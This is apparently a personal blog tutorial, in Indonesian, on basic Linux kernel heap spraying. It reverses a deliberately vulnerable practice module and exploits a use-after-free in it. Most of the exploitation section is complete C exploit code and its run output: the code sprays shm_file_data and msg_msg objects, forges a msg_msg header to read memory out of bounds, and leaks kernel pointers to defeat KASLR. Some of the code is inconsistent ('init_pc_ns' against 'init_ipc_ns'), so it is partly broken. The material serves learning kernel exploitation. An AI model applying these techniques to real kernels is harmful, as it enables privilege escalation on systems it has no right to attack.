---
title: "Linux Kernel PWN: Heap Spray Dasar"
date: 2024-08-09 00:00:00 + 0800
tags: [pwn]
categories: [linux-kernel-pwn]
---

Introduction
---

Setelah sebelumnya kita belajar bagaimana cara mengeksploitasi kerentanan stack overflow pada module kernel linux yang rentan, kali ini kita akan belajar cara memanfaatkan kerentanan memory pada kernel linux. walaupun pada kali ini kita tidak akan menyelesaikan tantangan terlebih dahulu melainkan kita akan belajar dasar ```heap spray```, Pengalokasi yang paling sederhana adalah mengalokasikan dalam satuan ukuran halaman seperti mmap, namun hal ini menciptakan banyak ruang yang tidak diperlukan dan menghabiskan sumber daya memori.
Mirip dengan malloc di ruang pengguna, kmalloc juga tersedia di ruang kernel. Ini menggunakan pengalokasi yang diinstal di kernel, ada beberapa pengalokasi di kernel linux seperti SLAB, SLUB, SLOB dan yang mendasari semua itu adalah buddy/page allocator yang mengelola memory dalam ukuran kelipatan halaman. namun pengalokasi yang sekarang digunakan secara default di kernel linux adalah SLUB allocator yang didasari oleh pengalokasi halaman/buddy allocator.

saya akan membahas tentang SLUB dan BUDDY allocator dipostingan terpisah dengan lebih detail nanti sambil melihat kode sumber dari kedua pengalokasi memory tersebut, karena kali ini saya hanya memperkenalkan saja dan fokus pada cara melakukan heap spray untuk membocorkan memory yang korup entah itu karena heap overflow atau use after free, dengan cara yang sangat dasar sehingga kita bisa dengan jelas memahami konsep nyata bagaimana cara memanfaatkan kerentanan memory pada kernel linux.

untuk bahan kali ini, saya mendapatkannya dari <a href="https://bitbucket.org/ptr-yudai/kexp-objects/src/master/">sini</a>

---

Reversing
---

Karena tidak ada kode sumber yang disediakan, kita berarti harus membongkar module tersebut. saya menggunakan ida free kali ini, karena saya lebih nyaman melakukan disassemble menggunakan ida.

<img src="{{ site.url }}{{ site.baseurl }}/images/reversing-heap-spray.png" alt="">

seperti yang kita lihat, fungsi mod_ioctl adalah fungsi untuk kita berinteraksi dengan module tersebut. ayo kita periksa hasil disassemblenya.

<img src="{{ site.url }}{{ site.baseurl }}/images/heap-spray-delete.jpg" alt="">

pertama, variable ```var_18h``` saya ubah namanya menjadi ```k_buf``` (kernel buff), dan ```var_10h``` menjadi ```u_buf``` (user buff). dan disana mod_ioctl() menerima data dari user untuk pertama kali, jika hasilnya rax atau pengecekan itu adalah 0, maka mod_ioctl() akan langsung mengembalikan return. dan jika hasil rax tidak 0, dia membandingkan flag yang kita kirim dengan yang ada didalam register ebx```0DEAD0002h``` (0xDEAD0002), kita lihat apa yang terjadi jika kita memasukkan flag tersebut:

<img src="{{ site.url }}{{ site.baseurl }}/images/heap-spray-delete-2.jpg" alt="">

kfree() akan dipanggil, seperti free() pada userland, kfree() juga dimaksudkan untuk membebaskan kembali potongan memory yang kita alokasikan. kita lihat lebih lanjut:

<img src="{{ site.url }}{{ site.baseurl }}/images/heap-spray-alloc.jpg" alt="">

flag yang kita kirim dibandingkan dengan flag ```0xDEAD0001```, jika benar. maka k_buf akan dialokasikan dengan ukuran yang sepertinya ```0x6000c0```, menurut saya. pembuat tantangan ini sengaja mengalokasikan memory dengan ukuran yang begitu besar agar kita bisa bisa belajar untuk membocorkan objek dalam ukuran yang kita mau yang akan segera kita bahas. kita lihat lebih lanjut:

<img src="{{ site.url }}{{ site.baseurl }}/images/heap-spray-load.jpg" alt="">

dalam intruksi itu, jika kita memasukkan flag ```0xDEAD0004```. ```k_buf``` dan ```u_buf``` akan dikirim ke kita menggunakan ```copy_to_user```

<img src="{{ site.url }}{{ site.baseurl }}/images/heap-spray-store.jpg" alt="">

terakhir, jika kita mengirim dengan flag ```0xDEAD0003```, ```copy_from_user``` dipanggil. kesimpulan saya adalah, kita bisa mengirim buffer dan mengalokasikan ```k_buf``` menggunakan flag ```0xDEAD0001```, lalu membebaskan memory ```k_buf``` dengan flag ```0xDEAD0002```, tapi kita ```k_buff``` tidak di NULL kan, kita bisa membocorkan pointernya menggunakan flag ```0xDEAD0004```, selain itu kita bisa memasukkan buffer dan data sembarang menggunakan flag ```0xDEAD0003``` dan ```u_buf``` disediakan untuk menampung buffer yang kita kirim. menyenangkan bukan?

---

Exploiting
---

Lalu, bagaimana cara kita memanfaatkan kerentanan tersebut? kita bisa mengalokasikan memory dengan ukuran tertentu untuk membocorkan objek kernel lain seperti menggunakan objek ```shm_file_data```, ```seq_operation```, ```msg_msg``` dan lainnya yang dialokasikan di kmalloc yang sama, jadi jika kita mengalokasikan objek yang rentan dengan ukuran tertentu, kita juga harus memanfaatkan objek yang dialkokasikan pada kmalloc-* yang sama dalam catatan object tersebut memiliki pointer function, contoh jika objek dialokasikan dengan ukuran ```0x400```, itu berarti objek tersebut akan masuk kedalam ```kmalloc-1024```, jadi kita bisa menyemprotkan objek ```tty_struct``` dengan cara ```open("/dev/ptmx")``` yang dimana akan membocorkan tty_operation, karena tty_operation secara tidak langsung memiliki penunjuk pointer yang bisa kita timpa untuk mengambil alih eksekusi kode, lihat kode sumber <a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143">tty.h</a>. 

Kali ini, kita akan mengalokasikan memory berukuran ```0x20``` yang akan ditempatkan di ```kmalloc-32```, lalu kita bisa menggunakan structure ```shm_file_data``` yang akan mengirim object ```init_ipc_ns```, object tersebut memiliki pointer ke segment .text kernel yang tidak terpengaruh oleh FG-KASLR untuk menghitung alamat basis kernel.

baik, kita langsung saja praktekan dengan cara paling sederhana:

```c
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/shm.h>

int fd;
struct {
  int size;
  char *note;
} cmd;
int new(int size) {
  cmd.size = size; cmd.note = NULL;
  return ioctl(fd, 0xdead0001, &cmd);
}
int delete(void) {
  cmd.size = 0; cmd.note = NULL;
  return ioctl(fd, 0xdead0002, &cmd);
}
int store(int size, void *note) {
  cmd.size = size; cmd.note = note;
  return ioctl(fd, 0xdead0003, &cmd);
}
int load(int size, void *note) {
  cmd.size = size; cmd.note = note;
  return ioctl(fd, 0xdead0004, &cmd);
}

void stop(void) {
  puts("Press enter to continue...");
  getchar();
}

int main() {
  unsigned long buf[0x200];
  memset(buf, 0, 0x1000);

  fd = open("/dev/test", O_RDWR);
  if (fd < 0) {
    perror("/dev/test");
    return 1;
  }

  new(0x20); //mengalokasikan memory dengan ukuran
  delete(); //hapus untuk memicu UAF

  /* leak kbase */
  int shmid;
  if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1) {
    perror("shmget");
    return 1;
  }
  char *shmaddr = shmat(shmid, NULL, 0);
  if (shmaddr == (void*)-1) {
    perror("shmat");
    return 1;
  }
  load(0x20, (void*)buf);
  for(int i = 0; i < 0x5; i++) {
    printf("0x%04x: 0x%016lx\n", i * 8, buf[i]);
  }
  unsigned long kheap = buf[2];
  unsigned long kbase = buf[1] - 0x1292ae0;
  printf("[+] kbase = 0x%016lx\n", kbase);
  printf("[+] kheap = 0x%016lx\n", kheap);

  return 0;
}


```

ini hasilnya:

```bash

/ # ./exp_shm
0x0000: 0x0000000000000000
0x0008: 0xffffffff82292ae0
0x0010: 0xffff888006304200
0x0018: 0xffffffff81e15540
0x0020: 0x0000000000000000
[+] kbase = 0xffffffff81000000
[+] kheap = 0xffff888006304200
/ # 

```

ingat, karena ini lingkungan latihan, sebagian besar mitigasi untuk kebocoran memory dinonaktifkan seperti ```CONFIG_SLAB_FREELIST_RANDOMIZATION```, ```CONFIG_SLAB_FREELIST_HARDENED```, ```CONFIG_RANDOM_KMALLOC_KACHE```, ```CONFIG_SHUFFLE_PAGE_ALLOCATOR``` dan lainnya, jadi hanya untuk memberikan gambaran saja. dalam sistem nyata, kita harus menyemprotkan banyak objek korban dalam slab partial, karena tidak ada jaminan object cache yang rentan dan korban akan bersebelahan ketika kita melakukan heap spray.

Selanjutnya, ayo kita coba cara lain, seperti menggunakan object ```msg_msgseg``` dari struct ```msg_msg``` untuk membocorkan object ```init_pc_ns``` yang dikirim oleh ```shm_file_data``` dari kerentanan ini.

Kernel menawarkan dua syscall untuk melakukan Komunikasi Antar Proses menggunakan pesan, ```msgsnd()``` dan ```msgrcv()``` , masing-masing digunakan untuk mengirim pesan ke, dan menerima pesan dari antrean pesan.

Pesan dalam ruang kernel terdiri dari dua bagian, header pesan, yang dijelaskan oleh struktur msg_msg dan data pesan, yang mengikutinya. Berikut ini strukturnya msg_msg:

```c
struct list_head {
	struct list_head *next, *prev;
};

struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;      /* ukuran text */
    struct msg_msgseg *next; //untuk segment pesan berikutnya
    void *security;

};

struct msg_msgseg {
	struct msg_msgseg *next;
	/* untuk segment pesan berikutnya*/
};

```
```m_list.next``` untuk menunjuk pesan lain dalam antrian, sementara ```msg_msg *next``` menunjukk ke segment pesan berikutnya, objek elastis ini banyak digunakan oleh pengembang kernel exploit untuk melakukan heap spray. Ukuran pesan dapat dikontrol oleh pengguna, oleh karena itu dapat dialokasikan dalam beberapa cache, mulai dari kmalloc-64 hingga kmalloc-4k.

sekarang, yo kita coba praktekan dengan mengubah kode kita yang sebelumnya.

```c
//kita buat antrian pesan terlebih dahulu
...
 int msqid;
    if((msqid = msgget(IPC_PRIVATE,0666|IPC_CREAT))==-1){
       perror("msgget");
       close(fd);
       return EXIT_FAILURE;
    }
...
```
lalu kirim pesan:

```c
...
msg_t *msg = (msg_t*)buff;

    msg->mtype = 1;
    memset(msg->mtext,0x43,0x1010);

    if(msgsnd(msqid,msg,0x1010-0x30,0)==-1){ //dikurangi 0x30 untuk ukuran header pesan
        perror("msgsnd");
        close(fd);
        return EXIT_FAILURE;
    }
...    
```
dalam hal ini, jika hanya ada satu pesan, bidang ```m_list.next``` dan ```m_list_prev``` akan menunjuk pada dirinya sendiri. dan ```msg_msgseg *next``` akan NULL, lalu kita semprotkan banyak ```shm_file_data```. 

```c
...
    int shmid;
    for(int i=0; i < 0x100; i++){
        if((shmid = shmget(IPC_PRIVATE,100,0600))==-1){
            perror("shmget");
            close(fd);
            return EXIT_FAILURE;
        }
    

        char *shmaddr;
        shmaddr = shmat(shmid,NULL,0);
        if(shmaddr == (void *)-1){
            perror("shmat");
            close(fd);
            return EXIT_FAILURE;
        }
    }
...    
```
lalu kita kirim data dengan ukuran 0x2000 untuk menimpa bidang ```m_text``` dalam struct ```msg_msg```

```c
...
 msg_evil evil;
    int size;
    size = 0x2000;
    memset((void *)&evil,0,sizeof(msg_evil));
    evil.m_next = (void *)0x4141414141414141;
    evil.m_prev = (void *)0x4242424242424242;
    evil.size = size;
    memset(buff,0,sizeof(buff));
    memcpy(buff,(void *)&evil,0x20);
    store(0x20,buff);
    
    unsigned long kbase, init_ipc_ns;
    load(0x1400,recv);
    for(int i=0;i < 0x1400 / 8;i++){
        printf("0x%04x: 0x%016lx\n" ,i , *(unsigned long*)(recv + i * 8));
        if((*(unsigned long *)(recv + i * 8) & 0xffff) == 0x5540){
            init_ipc_ns = *(unsigned long *)(recv + i * 8);
            break;
        }
    }

    kbase = init_ipc_ns - (0xffffffff81e15540 - 0xffffffff81000000);

    printf("init_ipc_ns: 0x%016lx\n" ,init_pc_ns);
    printf("kernel base: 0x%016lx\n" ,kbase);


```

ini kode lengkapnya:

```c

#define _GNU_SOURCE
#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<fcntl.h>
#include<string.h>
#include<pthread.h>
#include<linux/userfaultfd.h>
#include<sys/ioctl.h>
#include<sys/stat.h>
#include<sys/msg.h>
#include<sys/mman.h>
#include<sys/shm.h>

#define ADD 0xdead0001
#define DEL 0xdead0002
#define LOAD 0xdead0004
#define STORE 0xdead0003
#define SHM_SPRAY 30
#define PAGE 0x1000
int fd;
struct{
   int size;
   char *note;
}cmd;

typedef struct{
    int mtype;
    char mtext[1];
}msg_t;

typedef struct{
    void *m_next;
    void *m_prev;
    size_t size;
    int m_type;
    void *next;
    void *security;
}msg_evil;

int new(int size) {
  cmd.size = size; cmd.note = NULL;
  return ioctl(fd, 0xdead0001, &cmd);
}
int delete(void) {
  cmd.size = 0; cmd.note = NULL;
  return ioctl(fd, 0xdead0002, &cmd);
}
int store(int size, void *note) {
  cmd.size = size; cmd.note = note;
  return ioctl(fd, 0xdead0003, &cmd);
}
int load(int size, void *note) {
  cmd.size = size; cmd.note = note;
  return ioctl(fd, 0xdead0004, &cmd);
}

void stop(void) {
  puts("Press enter to continue...");
  getchar();
}

int main() {
 
    fd = open("/dev/test", O_RDWR);
    if(fd==-1){
        perror("/dev/test");
        close(fd);
        return 1;
    }else{
        puts("perangkat terbuka");
    }

    char buff[0x2000];
    char recv[0x2000];
    memset(buff,0,sizeof(buff));
    memset(recv,0,sizeof(recv));

    for(int i=0; i < 3;i++){
        new(0x20);
    }
    delete();
    
    int msqid;
    if((msqid = msgget(IPC_PRIVATE,0666|IPC_CREAT))==-1){
       perror("msgget");
       close(fd);
       return EXIT_FAILURE;
    }

    msg_t *msg = (msg_t*)buff;

    msg->mtype = 1;
    memset(msg->mtext,0x43,0x1010);

    if(msgsnd(msqid,msg,0x1010-0x30,0)==-1){
        perror("msgsnd");
        close(fd);
        return EXIT_FAILURE;
    }

    int shmid;
    for(int i=0; i < 0x100; i++){
        if((shmid = shmget(IPC_PRIVATE,100,0600))==-1){
            perror("shmget");
            close(fd);
            return EXIT_FAILURE;
        }
    

        char *shmaddr;
        shmaddr = shmat(shmid,NULL,0);
        if(shmaddr == (void *)-1){
            perror("shmat");
            close(fd);
            return EXIT_FAILURE;
        }
    }
    msg_evil evil;
    int size;
    size = 0x2000;
    memset((void *)&evil,0,sizeof(msg_evil));
    evil.m_next = (void *)0x4141414141414141;
    evil.m_prev = (void *)0x4242424242424242;
    evil.size = size;
    memset(buff,0,sizeof(buff));
    memcpy(buff,(void *)&evil,0x20);
    store(0x20,buff);
    
    unsigned long kbase, init_ipc_ns;
    load(0x1400,recv);
    for(int i=0;i < 0x1400 / 8;i++){
        printf("0x%04x: 0x%016lx\n" ,i , *(unsigned long*)(recv + i * 8));
        if((*(unsigned long *)(recv + i * 8) & 0xffff) == 0x5540){
            init_pc_ns = *(unsigned long *)(recv + i * 8);
            break;
        }
    }

    kbase = init_ipc_ns - (0xffffffff81e15540 - 0xffffffff81000000);

    printf("init_ipc_ns: 0x%016lx\n" ,init_ipc_ns);
    printf("kernel base: 0x%016lx\n" ,kbase);

    return 0;
}

```

ini hasilnya

```bash

/ # ./exp
perangkat terbuka
0x0000: 0x4141414141414141
0x0001: 0x4242424242424242
0x0002: 0x0000000000002000
0x0003: 0x0000000000000000
0x0004: 0x0000000001000200
0x0005: 0xffffffff82292ae0
0x0006: 0xffff88800790dc00
0x0007: 0xffffffff81e15540
init_ipc_ns: 0xffffffff81e15540
kernel base: 0xffffffff81000000

```
---

Referensi
---

<a href="https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628">https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a>

<a href="https://duasynt.com/blog/linux-kernel-heap-spray">https://duasynt.com/blog/linux-kernel-heap-spray</a>

<a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html</a>

<a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html</a>

<a href="https://syst3mfailure.io/wall-of-perdition/">https://syst3mfailure.io/wall-of-perdition/</a>

---
